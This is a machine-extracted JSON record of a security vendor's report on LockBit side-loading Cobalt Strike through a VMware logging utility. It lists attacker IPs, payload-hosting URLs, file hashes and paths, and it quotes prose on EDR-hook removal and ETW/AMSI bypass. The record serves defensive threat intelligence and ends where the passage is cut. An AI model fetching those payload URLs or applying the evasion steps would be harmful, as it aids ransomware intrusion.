{
    "title": "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
    "url": "https://www.sentinelone.com/labs/lockbit-ransomware-side-loads-cobalt-strike-beacon-with-legitimate-vmware-utility",
    "threats": {
        "Threat": [
            {
                "token": {
                    "id": "<THREAT_0xff6ba3c2>",
                    "type": "Threat",
                    "value": "cobalt_strike"
                },
                "references": {
                    "sentences": [
                        "Decrypted Cobalt Strike Beacon Reflective Loader",
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike.",
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a .log file.",
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility.",
                        "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC."
                    ],
                    "titles": [
                        "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
                        "Executive Summary",
                        "Indicators of Compromise",
                        "Bypassing EDR/EPP Userland Hooks",
                        "Attack Chain",
                        "MITRE ATT&CK TTPs",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x74437260>",
                            "type": "Threat",
                            "value": "stealbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x96c2bd7a>",
                            "type": "TTP",
                            "value": "t1027.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x66b95cbe>",
                            "type": "TTP",
                            "value": "t1574"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xcf7c5a4>",
                            "type": "TTP",
                            "value": "t1562.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "use_ttp",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<SHA1_0x1b511e51>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "091b490500b5f827cc8cde41c9a7f68174d11302"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x51cf9016>",
                            "type": "TTP",
                            "value": "t1059.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xfda51682>",
                            "type": "Category",
                            "value": "scan"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xe04c64c1>",
                            "type": "TTP",
                            "value": "t1562.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xa179f90c>",
                            "type": "Category",
                            "value": "ransomware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<THREAT_0xbfe21cbd>",
                    "type": "Threat",
                    "value": "lockbit"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike.",
                        "LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "Detection for LockBit DLL",
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility."
                    ],
                    "titles": [
                        "Conclusion",
                        "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
                        "Executive Summary",
                        "Bypassing EDR/EPP Userland Hooks",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x74437260>",
                            "type": "Threat",
                            "value": "stealbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x51cf9016>",
                            "type": "TTP",
                            "value": "t1059.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xa179f90c>",
                            "type": "Category",
                            "value": "ransomware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x95aa446f>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe;c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x40a8dd40>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x1f36c135>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log;"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xe04c64c1>",
                            "type": "TTP",
                            "value": "t1562.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xd6ff9946>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x918c0699>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "0c842d6e627152637f33ba86861d74f358a85e1f"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0x9cbc3e27>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x13c7001c>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xe007c24b>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "1458421f0a4fe3acc72a1246b80336dc4138dd4b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xfa8a332e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x20019eaf>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xb338d299>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "25fbfa37d5a01a97c4ad3f0ee0396f953ca51223"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<SHA1_0x1b511e51>",
                            "type": "Hash",
                            "hash_type": "SHA1",
                            "value": "091b490500b5f827cc8cde41c9a7f68174d11302"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x66b95cbe>",
                            "type": "TTP",
                            "value": "t1574"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0x38d0223e>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x96c2bd7a>",
                            "type": "TTP",
                            "value": "t1027.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xcf7c5a4>",
                            "type": "TTP",
                            "value": "t1562.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xfda51682>",
                            "type": "Category",
                            "value": "scan"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<URL_0xb9535c54>",
                            "type": "Url",
                            "value": "http://45.32.108.54:443/glib-2.0.dll"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<THREAT_0x2acd2db6>",
                    "type": "Threat",
                    "value": "reflectiveloader"
                },
                "references": {
                    "sentences": [
                        "Decrypted Cobalt Strike Beacon Reflective Loader",
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
